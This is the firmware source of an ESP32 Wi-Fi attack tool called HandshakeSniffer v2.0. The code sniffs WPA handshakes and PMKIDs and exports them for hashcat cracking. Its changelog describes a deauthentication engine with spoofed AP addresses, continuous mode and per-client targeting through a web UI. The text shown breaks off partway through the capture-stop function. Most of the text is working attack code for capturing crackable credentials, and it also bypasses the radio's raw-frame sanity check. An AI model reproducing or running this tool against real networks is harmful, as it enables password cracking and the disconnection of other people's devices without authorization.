/*
 ==============================================================
  HandshakeSniffer v2.0 — ESP32-S3 N16R8
  Passive EAPOL / PMKID sniffer + active deauth engine
  Full Web UI with live capture graph, per-client tracking,
  multi-target deauth, adaptive channel follow, and hashcat export.

  CHANGES FROM v1.4:
    CAPTURE ENGINE:
    - Per-client HandshakeState tracking (up to 16 simultaneous
      client sessions) keyed by (AP_MAC, CLI_MAC) pair.
      v1.4 tracked only one global session — multi-client APs
      would clobber state when a second client was deauthed.
    - PMKID extraction hardened: now also parses RSN IE in
      Beacon/ProbeResp frames (OUI 00:0F:AC:04) for PMK-cached
      PMKID, not just M1 key data. Higher PMKID hit rate.
    - MIC validation flag: records whether MIC field is nonzero
      so the 22000 exporter can flag "MIC present" vs zero-MIC.
    - EAPOL replay counter stored per session — detects
      retransmitted M1 so we don't overwrite a good ANonce with
      a retx copy.
    - Radiotap extended: adds RSSI (antenna signal, present bit 5)
      and rate (present bit 1) fields. Wireshark now shows signal
      strength per frame.
    - appendFrame now enforces CAP_BUF_SIZE - sizeof(PcapGlobalHdr)
      hard ceiling and sets a capFull flag so the UI can warn.

    DEAUTH ENGINE:
    - Per-client targeted deauth: UI shows connected client list
      (sniffed from Data frames) with checkboxes to select
      individual clients for unicast deauth.
    - Broadcast + unicast combo: sends both broadcast deauth
      (addr1=FF:FF:FF:FF:FF:FF) and targeted unicast deauth
      (addr1=client_mac) with spoofed src=AP_MAC in same burst.
    - Adaptive channel follow: deauth_task calls
      esp_wifi_set_channel() per burst using live g_targetChannel
      so if the target AP hops (rare but happens on dual-band
      APs with band steering) the frames follow.
    - Configurable reason codes via UI (7, 1, 3, 8, 15) — some
      APs ignore reason 7; reason 1 (unspecified) works more broadly.
    - Inter-frame gap tunable: 50µs / 100µs / 200µs selectable.
    - Continuous mode: optional loop that repeats deauth every
      N seconds until manually stopped, for stubborn APs.
    - TX power boost before deauth burst, restored after.

    WEB UI:
    - Live capture byte-count sparkline graph (canvas, last 60
      samples, updates every 2s) shows capture activity at a glance.
    - Per-client session table: BSSID/Client MAC, M1/M2/M3/M4/PMKID
      badges, Crackable flag, byte count, per-row export buttons.
    - Connected clients panel: devices seen sending data frames
      to the target AP, with per-client deauth checkbox + button.
    - Reason code selector and inter-frame gap selector in UI.
    - Continuous deauth toggle with interval selector.
    - RSSI sparkline per AP in scan table.
    - Auto-restart capture after deauth burst (was a manual step).
    - Dark/light mode toggle (persisted in localStorage).
    - Keyboard shortcut: S = scan, D = deauth, Esc = stop.

    BUG FIXES:
    - Mutex timeout raised again: hsMutex 30ms → 60ms (per-session
      table lock can be held longer with 16 sessions).
    - deauth_task: channel re-set moved inside per-burst loop
      (not just before the first burst) so channel follow works.
    - scan_task: WiFi.scanDelete() now called before restoring
      promisc (v1.4 called it before the promisc restore but after
      the mutex release — race if promisc callback fired while
      scan results were still allocated).
    - stopCapture: promisc task notification moved before setting
      g_promiscRunning=false to avoid race where the task checks
      the flag before receiving notification.
    - buildJSON/build22000: now returns data for ALL sessions,
      not just the first crackable one.

  HARDWARE: Same as v1.4 — ESP32-S3 N16R8
    Board            : ESP32S3 Dev Module
    Flash Size       : 16MB (128Mb)
    Partition Scheme : Huge APP (3MB No OTA / 1MB SPIFFS)
    PSRAM            : OPI PSRAM
    USB Mode         : Hardware CDC and JTAG
    USB CDC On Boot  : Disabled  ← CRITICAL
    CPU Frequency    : 240MHz
    NeoPixel pin     : 48

  LIBS: Same as v1.4 (see build.yml)

  AP:  HandshakeSniffer / password: sniff1234
  UI:  http://192.168.4.1/
 ==============================================================
*/

// ── LED state enum — above includes ──────────────────────────────────────────
enum LedState { LS_OFF, LS_BLUE, LS_GREEN, LS_RED, LS_YELLOW, LS_CYAN, LS_PURPLE, LS_WHITE };
volatile LedState ledState = LS_BLUE;

#include <Arduino.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <esp_timer.h>
#include <nvs_flash.h>
#include <Preferences.h>
#include <Adafruit_NeoPixel.h>
#include <esp_heap_caps.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <freertos/semphr.h>

// ── libnet80211 sanity check override — required for raw TX (deauth) ─────────
extern "C" int ieee80211_raw_frame_sanity_check(int32_t a, int32_t b, int32_t c) {
  (void)a; (void)b; (void)c; return 0;
}

// ─── CONFIG ──────────────────────────────────────────────────────────────────
#define AP_SSID          "HandshakeSniffer"
#define AP_PASS          "sniff1234"
#define AP_CHANNEL       6
#define WEB_PORT         80
#define LED_PIN          48
#define LED_COUNT        1
#define MAX_TX_POWER     78

// PCAP buffer in PSRAM — 1MB (doubled from v1.4)
#define CAP_BUF_SIZE     (1024 * 1024)

// Log ring
#define LOG_MAX          64

// Scan
#define SCAN_MAX_APS     32
#define SEM_TIMEOUT      pdMS_TO_TICKS(3000)

// Per-client session tracking
#define MAX_SESSIONS     16

// Connected client tracking
#define MAX_CLIENTS      24

// Deauth: inter-frame gaps in µs
static const uint32_t kGaps[] = { 50, 100, 200 };

// ─── NEOPIXEL ────────────────────────────────────────────────────────────────
Adafruit_NeoPixel led(LED_COUNT, LED_PIN, NEO_GRB + NEO_KHZ800);

static void setLed(LedState s) { ledState = s; }

void updateLED() {
  static LedState   last   = LS_OFF;
  static uint32_t   tmr    = 0;
  static bool       bright = true;
  LedState          s      = ledState;

  auto pulse = [&](uint32_t on, uint32_t off, uint32_t ms) {
    bool toggled = (millis() - tmr > ms);
    if (toggled) { tmr = millis(); bright = !bright; }
    if (toggled || s != last) {
      led.setPixelColor(0, bright ? led.Color(on>>16, on>>8&0xFF, on&0xFF)
                                  : led.Color(off>>16, off>>8&0xFF, off&0xFF));
      led.show();
    }
    last = s;
  };

  if (s == LS_PURPLE) { pulse(0x1C0020, 0x080010, 700); return; }
  if (s == LS_YELLOW) { pulse(0x281C00, 0x0C0800, 300); return; }
  if (s == LS_CYAN)   { pulse(0x002020, 0x000808, 500); return; }
  if (s == LS_WHITE)  { pulse(0x202020, 0x080808, 200); return; }
  if (s == last) return;
  last = s;
  switch (s) {
    case LS_BLUE:  led.setPixelColor(0, led.Color(0,0,40));    break;
    case LS_GREEN: led.setPixelColor(0, led.Color(0,40,0));    break;
    case LS_RED:   led.setPixelColor(0, led.Color(40,0,0));    break;
    default:       led.setPixelColor(0, led.Color(0,0,0));     break;
  }
  led.show();
}

// ─── SERIAL LOG ──────────────────────────────────────────────────────────────
#define DBG(f,...)  Serial0.printf("[DBG] "  f "\n", ##__VA_ARGS__)
#define INFO(f,...) Serial0.printf("[INFO] " f "\n", ##__VA_ARGS__)
#define ERR(f,...)  Serial0.printf("[ERR] "  f "\n", ##__VA_ARGS__)

// ─── EVENT LOG ───────────────────────────────────────────────────────────────
struct LogEntry { uint32_t ts; char msg[96]; };
static LogEntry          g_log[LOG_MAX];
static int               g_logHead  = 0;
static int               g_logCount = 0;
static SemaphoreHandle_t g_logMutex = NULL;

void logEvent(const char* fmt, ...) {
  char tmp[96];
  va_list ap; va_start(ap, fmt); vsnprintf(tmp, sizeof(tmp), fmt, ap); va_end(ap);
  Serial0.printf("[LOG] %s\n", tmp);
  if (!g_logMutex) return;
  if (xSemaphoreTake(g_logMutex, pdMS_TO_TICKS(20)) != pdTRUE) return;
  g_log[g_logHead].ts = millis();
  strncpy(g_log[g_logHead].msg, tmp, 95);
  g_log[g_logHead].msg[95] = '\0';
  g_logHead = (g_logHead + 1) % LOG_MAX;
  if (g_logCount < LOG_MAX) g_logCount++;
  xSemaphoreGive(g_logMutex);
}

// ─── PCAP STRUCTS ────────────────────────────────────────────────────────────
struct __attribute__((packed)) PcapGlobalHdr {
  uint32_t magic;
  uint16_t vmaj, vmin;
  int32_t  zone;
  uint32_t sigs, snap;
  uint32_t net;  // 127 = LINKTYPE_IEEE802_11_RADIOTAP
};
struct __attribute__((packed)) PcapRecHdr {
  uint32_t ts_sec, ts_usec, incl_len, orig_len;
};

// Extended radiotap: version + pad + len + present_bitmap
// Present bits: 1=RATE, 5=ANT_SIGNAL (RSSI), 3=CHANNEL
// Layout: it_version(1) it_pad(1) it_len(2) it_present(4)
//         rate(1) pad(1) ant_signal(1) pad(1) chan_freq(2) chan_flags(2)
// Total: 14 bytes, aligned
struct __attribute__((packed)) RadiotapHdr {
  uint8_t  it_version;  // 0
  uint8_t  it_pad;      // 0
  uint16_t it_len;      // 14
  uint32_t it_present;  // 0x0000002A = bits 1,3,5
  uint8_t  rate;        // in 500Kbps units; 0x02 = 1Mbps (unknown)
  uint8_t  rate_pad;    // alignment pad
  int8_t   ant_signal;  // RSSI in dBm
  uint8_t  sig_pad;     // alignment pad
  uint16_t chan_freq;   // center freq in MHz
  uint16_t chan_flags;  // 0x00C0 = 2GHz + OFDM
};

static inline uint16_t ch2freq(int ch) {
  if (ch == 14) return 2484;
  return (uint16_t)(2407 + ch * 5);
}

// ─── 802.11 HEADER ───────────────────────────────────────────────────────────
struct __attribute__((packed)) Ieee80211Hdr {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};

// ─── PER-CLIENT HANDSHAKE SESSION ────────────────────────────────────────────
struct HsSession {
  bool    active;
  bool    m1, m2, m3, m4;
  bool    pmkid;
  bool    mic_valid;      // MIC field is nonzero
  uint8_t pmkid_bytes[16];
  uint8_t ap_mac[6];
  uint8_t cli_mac[6];
  uint8_t anonce[32];
  uint8_t snonce[32];
  uint8_t mic[16];
  uint8_t mic_data[128];
  uint16_t mic_data_len;
  uint8_t rsnie[64];
  uint8_t rsnie_len;
  uint64_t replay_ctr;    // last seen replay counter (detect retx M1)
  uint32_t first_seen;    // millis() of first EAPOL frame
  uint32_t last_seen;     // millis() of most recent EAPOL frame
};

// ─── CONNECTED CLIENT TRACKING ───────────────────────────────────────────────
struct ClientEntry {
  bool    active;
  uint8_t mac[6];
  int8_t  rssi;
  uint32_t last_seen;
  uint32_t frame_count;
};

// ─── CAPTURE STATE ────────────────────────────────────────────────────────────
static uint8_t*          g_capBuf      = nullptr;
static size_t            g_capLen      = 0;
static bool              g_capActive   = false;
static bool              g_capFull     = false;
static SemaphoreHandle_t g_capMutex    = NULL;

static HsSession         g_sessions[MAX_SESSIONS] = {};
static int               g_sessionCount = 0;
static SemaphoreHandle_t g_hsMutex    = NULL;

static ClientEntry       g_clients[MAX_CLIENTS] = {};
static int               g_clientCount = 0;
static SemaphoreHandle_t g_cliMutex   = NULL;

static uint8_t           g_targetBSSID[6]  = {0};
static int               g_targetChannel   = 0;
static char              g_targetSSID[33]  = "";
static bool              g_filterTarget    = false;

// Sparkline: capture byte deltas for graph (60 samples, 2s interval)
#define SPARK_LEN 60
static uint32_t          g_sparkline[SPARK_LEN] = {};
static uint32_t          g_sparkPrev  = 0;
static int               g_sparkHead  = 0;
static SemaphoreHandle_t g_sparkMutex = NULL;

// ─── SCAN RESULTS ────────────────────────────────────────────────────────────
struct APEntry {
  char    ssid[33];
  uint8_t bssid[6];
  int     rssi;
  int     channel;
  int     enc;
};

static APEntry           g_aps[SCAN_MAX_APS];
static int               g_apCount    = 0;
static volatile bool     g_scanBusy   = false;
static SemaphoreHandle_t g_scanMutex  = NULL;
static String            g_scanCache  = "";

// ─── DEAUTH STATE ────────────────────────────────────────────────────────────
static volatile bool     g_deauthRunning  = false;
static volatile bool     g_deauthCont     = false;   // continuous mode
static uint32_t          g_deauthInterval = 5000;    // ms between cont bursts
static TaskHandle_t      g_deauthTask     = NULL;
static int               g_deauthBursts   = 5;
static uint8_t           g_deauthReason   = 7;       // reason code
static uint8_t           g_deauthGapIdx   = 1;       // index into kGaps[]

// Target client for unicast deauth (zero = broadcast only)
static uint8_t           g_deauthClientMAC[6] = {0};

// ─── PROMISCUOUS STATE ────────────────────────────────────────────────────────
static volatile bool     g_promiscRunning = false;
static volatile bool     g_promiscPaused  = false;
static TaskHandle_t      g_promiscTask    = NULL;

// ─── WEB SERVER + DNS ─────────────────────────────────────────────────────────
AsyncWebServer server(WEB_PORT);
DNSServer      dns;

// ─── HELPERS ─────────────────────────────────────────────────────────────────
static void mac2str(const uint8_t* m, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0],m[1],m[2],m[3],m[4],m[5]);
}
static bool macZero(const uint8_t* m) {
  return !(m[0]|m[1]|m[2]|m[3]|m[4]|m[5]);
}
static bool macEq(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}
static bool macParse(const char* s, uint8_t* out) {
  return sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
    &out[0],&out[1],&out[2],&out[3],&out[4],&out[5]) == 6;
}

static const char kHex[] = "0123456789abcdef";
static void bytesToHex(const uint8_t* b, int len, char* out) {
  for (int i = 0; i < len; i++) {
    out[i*2]   = kHex[b[i] >> 4];
    out[i*2+1] = kHex[b[i] & 0xF];
  }
  out[len*2] = '\0';
}

// ─── SESSION MANAGEMENT ──────────────────────────────────────────────────────
// Caller must hold g_hsMutex.
static HsSession* findOrCreateSession(const uint8_t* ap, const uint8_t* cli) {
  for (int i = 0; i < MAX_SESSIONS; i++) {
    if (g_sessions[i].active &&
        macEq(g_sessions[i].ap_mac, ap) &&
        macEq(g_sessions[i].cli_mac, cli))
      return &g_sessions[i];
  }
  // Allocate new slot — evict oldest if full
  int slot = -1;
  uint32_t oldest = UINT32_MAX;
  for (int i = 0; i < MAX_SESSIONS; i++) {
    if (!g_sessions[i].active) { slot = i; break; }
    if (g_sessions[i].first_seen < oldest) { oldest = g_sessions[i].first_seen; slot = i; }
  }
  if (slot < 0) slot = 0;
  memset(&g_sessions[slot], 0, sizeof(HsSession));
  g_sessions[slot].active     = true;
  g_sessions[slot].first_seen = millis();
  memcpy(g_sessions[slot].ap_mac,  ap,  6);
  memcpy(g_sessions[slot].cli_mac, cli, 6);
  if (g_sessionCount < MAX_SESSIONS) g_sessionCount++;
  return &g_sessions[slot];
}

// ─── CLIENT TRACKING ─────────────────────────────────────────────────────────
// Called from ISR context via promisc_cb — must be IRAM_ATTR, non-blocking.
static void IRAM_ATTR trackClient(const uint8_t* mac, int8_t rssi) {
  if (!g_cliMutex) return;
  BaseType_t woken = pdFALSE;
  if (xSemaphoreTakeFromISR(g_cliMutex, &woken) != pdTRUE) return;

  uint32_t now = (uint32_t)(esp_timer_get_time() / 1000);
  for (int i = 0; i < MAX_CLIENTS; i++) {
    if (g_clients[i].active && macEq(g_clients[i].mac, mac)) {
      g_clients[i].rssi      = rssi;
      g_clients[i].last_seen = now;
      g_clients[i].frame_count++;
      xSemaphoreGiveFromISR(g_cliMutex, &woken);
      if (woken) portYIELD_FROM_ISR();
      return;
    }
  }
  // New client
  for (int i = 0; i < MAX_CLIENTS; i++) {
    if (!g_clients[i].active) {
      g_clients[i].active      = true;
      g_clients[i].rssi        = rssi;
      g_clients[i].last_seen   = now;
      g_clients[i].frame_count = 1;
      memcpy(g_clients[i].mac, mac, 6);
      if (g_clientCount < MAX_CLIENTS) g_clientCount++;
      break;
    }
  }
  xSemaphoreGiveFromISR(g_cliMutex, &woken);
  if (woken) portYIELD_FROM_ISR();
}

// ─── PCAP APPEND ─────────────────────────────────────────────────────────────
static void IRAM_ATTR appendFrame(const uint8_t* payload, uint16_t plen,
                                   int channel, int8_t rssi) {
  if (plen == 0 || !g_capBuf || !g_capMutex || g_capFull) return;
  BaseType_t woken = pdFALSE;
  if (xSemaphoreTakeFromISR(g_capMutex, &woken) != pdTRUE) return;

  const uint16_t rtap_len = sizeof(RadiotapHdr);
  const uint32_t need     = sizeof(PcapRecHdr) + rtap_len + plen;
  const size_t   ceiling  = CAP_BUF_SIZE - sizeof(PcapGlobalHdr);

  if (g_capLen + need <= ceiling) {
    int64_t  us      = esp_timer_get_time();
    uint32_t ts_sec  = (uint32_t)(us / 1000000LL);
    uint32_t ts_usec = (uint32_t)(us % 1000000LL);

    PcapRecHdr rh = { ts_sec, ts_usec, rtap_len + plen, rtap_len + plen };
    RadiotapHdr rt = {
      0, 0,
      rtap_len,
      0x0000002Au,          // bits 1,3,5 present
      0x02,                 // rate: 1Mbps placeholder
      0,                    // pad
      rssi,                 // antenna signal (dBm)
      0,                    // pad
      ch2freq(channel),
      0x00C0u
    };
    memcpy(g_capBuf + g_capLen, &rh, sizeof(rh)); g_capLen += sizeof(rh);
    memcpy(g_capBuf + g_capLen, &rt, sizeof(rt)); g_capLen += sizeof(rt);
    memcpy(g_capBuf + g_capLen, payload, plen);   g_capLen += plen;
  } else {
    g_capFull = true;
  }

  xSemaphoreGiveFromISR(g_capMutex, &woken);
  if (woken) portYIELD_FROM_ISR();
}

// ─── EAPOL PARSER ────────────────────────────────────────────────────────────
static const uint16_t EAPOL_MIC_OFFSET    = 65;
static const uint16_t EAPOL_NONCE_OFFSET  = 17;
static const uint16_t EAPOL_REPLAY_OFFSET = 9;  // 8-byte replay counter
static const uint16_t EAPOL_KD_LEN_OFFSET = 81;
static const uint16_t EAPOL_KD_OFFSET     = 83;

#define KI_PAIRWISE  (1 << 3)
#define KI_INSTALL   (1 << 6)
#define KI_ACK       (1 << 7)
#define KI_MIC       (1 << 8)
#define KI_SECURE    (1 << 9)

static void parseEAPOL(const uint8_t* dot11, uint16_t plen) {
  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)dot11;
  uint16_t fc      = hdr->frame_ctrl;
  uint8_t  subtype = (fc >> 4) & 0x0F;
  bool     toDS    = (fc >> 8) & 0x01;
  bool     fromDS  = (fc >> 9) & 0x01;
  bool     encr    = (fc >> 14) & 0x01;

  if (encr) return;

  uint16_t hdr_len = (subtype >= 8) ? 26 : 24;
  if (plen < (uint16_t)(hdr_len + 12)) return;

  const uint8_t* llc = dot11 + hdr_len;
  if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
  if (llc[6] != 0x88 || llc[7] != 0x8E) return;

  const uint8_t* eapol    = llc + 8;
  uint16_t       eapol_max = plen - hdr_len - 8;
  if (eapol_max < 99) return;

  if (eapol[1] != 3) return;  // not EAPOL-Key
  uint16_t ki   = ((uint16_t)eapol[5] << 8) | eapol[6];
  bool pairwise = (ki & KI_PAIRWISE) != 0;
  bool ack      = (ki & KI_ACK)      != 0;
  bool mic      = (ki & KI_MIC)      != 0;
  bool secure   = (ki & KI_SECURE)   != 0;
  bool install  = (ki & KI_INSTALL)  != 0;

  if (!pairwise) return;

  int msg = 0;
  if ( ack && !mic)                            msg = 1;
  else if (!ack &&  mic && !secure)            msg = 2;
  else if ( ack &&  mic && secure && install)  msg = 3;
  else if (!ack &&  mic && secure && !install) msg = 4;
  if (msg == 0) return;

  // Replay counter from EAPOL-Key header (big-endian 8 bytes at offset 9)
  uint64_t replay = 0;
  for (int i = 0; i < 8; i++)
    replay = (replay << 8) | eapol[EAPOL_REPLAY_OFFSET + i];

  const uint8_t* ap_mac  = hdr->addr3;
  const uint8_t* cli_mac = (toDS && !fromDS) ? hdr->addr2 : hdr->addr1;

  if (g_filterTarget && !macZero(g_targetBSSID))
    if (!macEq(ap_mac, g_targetBSSID)) return;

  // Raised 30ms → 60ms: per-session table lock
  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(60)) != pdTRUE) return;

  HsSession* s = findOrCreateSession(ap_mac, cli_mac);
  s->last_seen = millis();

  if (msg == 1) {
    // Detect M1 retransmit — don't overwrite ANonce with retx copy
    bool is_retx = (s->m1 && replay <= s->replay_ctr);
    if (!is_retx) {
      s->m1 = true;
      s->replay_ctr = replay;
      memcpy(s->anonce, eapol + EAPOL_NONCE_OFFSET, 32);

      // PMKID extraction from key data
      uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
                      |             eapol[EAPOL_KD_LEN_OFFSET + 1];
      if (kd_len >= 20 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
        const uint8_t* kd  = eapol + EAPOL_KD_OFFSET;
        uint16_t       pos = 0;
        while (pos + 2 <= kd_len) {
          uint8_t tag  = kd[pos];
          uint8_t tlen = kd[pos + 1];
          if (tlen == 0) break;
          if (tag == 0xDD && tlen >= 18 && pos + 2 + tlen <= kd_len) {
            if (kd[pos+2]==0x00 && kd[pos+3]==0x0F &&
                kd[pos+4]==0xAC && kd[pos+5]==0x04) {
              memcpy(s->pmkid_bytes, kd + pos + 6, 16);
              s->pmkid = true;
            }
          }
          pos += 2 + tlen;
        }
      }
    }
  }
  else if (msg == 2) {
    s->m2 = true;
    memcpy(s->snonce, eapol + EAPOL_NONCE_OFFSET, 32);
    memcpy(s->mic,    eapol + EAPOL_MIC_OFFSET,   16);
    // Check MIC is nonzero
    s->mic_valid = false;
    for (int i = 0; i < 16; i++) if (s->mic[i]) { s->mic_valid = true; break; }
    uint16_t copy = (eapol_max < 128) ? eapol_max : 128;
    memcpy(s->mic_data, eapol, copy);
    s->mic_data_len = copy;
    uint16_t kd_len = ((uint16_t)eapol[EAPOL_KD_LEN_OFFSET] << 8)
                    |             eapol[EAPOL_KD_LEN_OFFSET + 1];
    if (kd_len > 0 && kd_len <= 64 && (EAPOL_KD_OFFSET + kd_len) <= eapol_max) {
      memcpy(s->rsnie, eapol + EAPOL_KD_OFFSET, kd_len);
      s->rsnie_len = (uint8_t)kd_len;
    }
  }
  else if (msg == 3) { s->m3 = true; }
  else if (msg == 4) { s->m4 = true; }

  xSemaphoreGive(g_hsMutex);

  static const char* mname[] = {"","M1","M2","M3","M4"};
  char ab[18]; mac2str(ap_mac, ab);
  char cb[18]; mac2str(cli_mac, cb);
  logEvent("EAPOL %s  AP:%s  CLI:%s", mname[msg], ab, cb);
  if (msg == 1 && !macZero(ap_mac)) {
    HsSession* chk = nullptr;
    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
      chk = findOrCreateSession(ap_mac, cli_mac);
      bool hasPmkid = chk->pmkid;
      xSemaphoreGive(g_hsMutex);
      if (hasPmkid) logEvent("PMKID extracted!  AP:%s", ab);
    }
  }
  if (msg == 2) logEvent("MIC captured — M1+M2 crackable!  CLI:%s", cb);
}

// ─── BEACON/PROBERESP PMKID SCANNER ─────────────────────────────────────────
// Scans management frames for PMKID in RSN IE — higher hit rate
// because some APs embed PMKID in beacons without requiring deauth.
static void IRAM_ATTR parseMgmtForPMKID(const uint8_t* payload, uint16_t plen) {
  if (plen < 36) return;
  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)payload;
  uint8_t subtype = (hdr->frame_ctrl >> 4) & 0x0F;
  // 0x8 = Beacon, 0x5 = ProbeResp
  if (subtype != 0x8 && subtype != 0x5) return;

  const uint8_t* ap_mac = hdr->addr3;
  if (g_filterTarget && !macZero(g_targetBSSID))
    if (!macEq(ap_mac, g_targetBSSID)) return;

  // Fixed fields after 802.11 header: Beacon=12, ProbeResp=12
  const uint8_t* ies    = payload + 36;
  uint16_t       ie_len = (plen > 36) ? plen - 36 : 0;
  uint16_t       pos    = 0;

  while (pos + 2 <= ie_len) {
    uint8_t id   = ies[pos];
    uint8_t len  = ies[pos + 1];
    if (len == 0 || pos + 2 + len > ie_len) break;

    // RSN IE (id=48) — look for PMKID list at the end
    if (id == 48 && len >= 20) {
      const uint8_t* rsn = ies + pos + 2;
      uint16_t off = 2; // skip version
      if (off + 4 <= len) {
        off += 4; // skip group cipher suite
        if (off + 2 <= len) {
          uint16_t pairwise_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
          off += 2 + pairwise_cnt * 4;
          if (off + 2 <= (uint16_t)len) {
            uint16_t akm_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
            off += 2 + akm_cnt * 4;
            if (off + 2 <= (uint16_t)len) {
              off += 2; // skip RSN capabilities
              if (off + 2 <= (uint16_t)len) {
                uint16_t pmkid_cnt = (uint16_t)rsn[off] | ((uint16_t)rsn[off+1] << 8);
                off += 2;
                if (pmkid_cnt > 0 && off + 16 <= (uint16_t)len) {
                  // PMKID found in beacon/probeResp
                  uint8_t pmkid_buf[16];
                  memcpy(pmkid_buf, rsn + off, 16);
                  // Use a synthetic cli_mac = zeros (PMKID from beacon,
                  // no client yet) — keyed per AP
                  uint8_t zero_cli[6] = {0};
                  if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
                    HsSession* s = findOrCreateSession(ap_mac, zero_cli);
                    if (!s->pmkid) {
                      memcpy(s->pmkid_bytes, pmkid_buf, 16);
                      s->pmkid = true;
                      char ab[18]; mac2str(ap_mac, ab);
                      xSemaphoreGive(g_hsMutex);
                      logEvent("PMKID from beacon!  AP:%s", ab);
                      return;
                    }
                    xSemaphoreGive(g_hsMutex);
                  }
                }
              }
            }
          }
        }
      }
    }
    pos += 2 + len;
  }
}

// ─── PROMISCUOUS CALLBACK ────────────────────────────────────────────────────
void IRAM_ATTR promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (g_promiscPaused || !g_capActive) return;
  if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t* pkt = (const wifi_promiscuous_pkt_t*)buf;
  uint16_t plen = pkt->rx_ctrl.sig_len;
  if (plen < 24) return;

  int8_t rssi = (int8_t)pkt->rx_ctrl.rssi;
  int    ch   = (int)pkt->rx_ctrl.channel;

  const Ieee80211Hdr* hdr = (const Ieee80211Hdr*)pkt->payload;
  uint8_t ftype   = (hdr->frame_ctrl >> 2) & 0x03;
  uint8_t subtype = (hdr->frame_ctrl >> 4) & 0x0F;

  appendFrame(pkt->payload, plen, ch, rssi);

  if (ftype == 2) {  // Data frame
    // Track client: if toDS, addr2 = client
    bool toDS   = (hdr->frame_ctrl >> 8) & 0x01;
    bool fromDS = (hdr->frame_ctrl >> 9) & 0x01;
    if (toDS && !fromDS && g_filterTarget && !macZero(g_targetBSSID)) {
      if (macEq(hdr->addr1, g_targetBSSID) || macEq(hdr->addr3, g_targetBSSID)) {
        trackClient(hdr->addr2, rssi);
      }
    }
    parseEAPOL(pkt->payload, plen);
  } else if (ftype == 0) {  // Management frame
    parseMgmtForPMKID(pkt->payload, plen);
  }
}

// ─── PROMISC TASK ────────────────────────────────────────────────────────────
void promisc_task(void* param) {
  INFO("Promisc sniffer up core %d ch %d", xPortGetCoreID(), g_targetChannel);
  ulTaskNotifyTake(pdTRUE, portMAX_DELAY);
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  g_promiscTask = NULL;
  vTaskDelete(NULL);
}

// ─── SPARKLINE UPDATE TASK ───────────────────────────────────────────────────
void spark_task(void* param) {
  while (true) {
    vTaskDelay(pdMS_TO_TICKS(2000));
    uint32_t cur = 0;
    if (g_capMutex && xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
      cur = (uint32_t)g_capLen;
      xSemaphoreGive(g_capMutex);
    }
    uint32_t delta = (cur >= g_sparkPrev) ? (cur - g_sparkPrev) : 0;
    g_sparkPrev = cur;
    if (g_sparkMutex && xSemaphoreTake(g_sparkMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
      g_sparkline[g_sparkHead] = delta;
      g_sparkHead = (g_sparkHead + 1) % SPARK_LEN;
      xSemaphoreGive(g_sparkMutex);
    }
  }
}

// ─── CAPTURE CONTROL ─────────────────────────────────────────────────────────
void startCapture(int channel, const uint8_t* bssid, const char* ssid, bool filterBSSID) {
  if (g_promiscRunning) return;

  if (g_capMutex && xSemaphoreTake(g_capMutex, SEM_TIMEOUT) == pdTRUE) {
    g_capLen  = 0;
    g_capFull = false;
    if (g_capBuf) {
      PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 127};
      memcpy(g_capBuf, &gh, sizeof(gh));
      g_capLen = sizeof(gh);
    }
    xSemaphoreGive(g_capMutex);
  }

  if (g_hsMutex && xSemaphoreTake(g_hsMutex, SEM_TIMEOUT) == pdTRUE) {
    memset(g_sessions, 0, sizeof(g_sessions));
    g_sessionCount = 0;
    xSemaphoreGive(g_hsMutex);
  }

  if (g_cliMutex && xSemaphoreTake(g_cliMutex, SEM_TIMEOUT) == pdTRUE) {
    memset(g_clients, 0, sizeof(g_clients));
    g_clientCount = 0;
    xSemaphoreGive(g_cliMutex);
  }

  g_targetChannel = channel;
  g_filterTarget  = filterBSSID;
  if (bssid) memcpy(g_targetBSSID, bssid, 6);
  else       memset(g_targetBSSID, 0, 6);
  if (ssid)  { strncpy(g_targetSSID, ssid, 32); g_targetSSID[32] = '\0'; }
  else       g_targetSSID[0] = '\0';

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(20);

  g_capActive = true;
  esp_wifi_set_promiscuous_rx_cb(promisc_cb);
  esp_wifi_set_promiscuous(true);
  g_promiscRunning = true;
  g_promiscPaused  = false;

  xTaskCreatePinnedToCore(promisc_task, "promisc", 2048, NULL, 1, &g_promiscTask, 1);
  setLed(LS_CYAN);

  char bstr[18] = "(all)";
  if (bssid && !macZero(bssid)) mac2str(bssid, bstr);
  logEvent("Capture started: ch%d  target=%s  filter=%d", channel, bstr, filterBSSID ? 1 : 0);
}

void stopCapture() {
  if (!g_promiscRunning) return;
  g_capActive = false;

  // Notify task first, then clear flag — avoids race
  if (g_promiscTask) {
    xTaskNotifyGive(g_promiscTask);
    vTaskDelay(pdMS_TO_TICKS(120));
  } else {
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous(false);
  }

  g_promiscRunning = false;
  g_promiscPaused  = false;

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
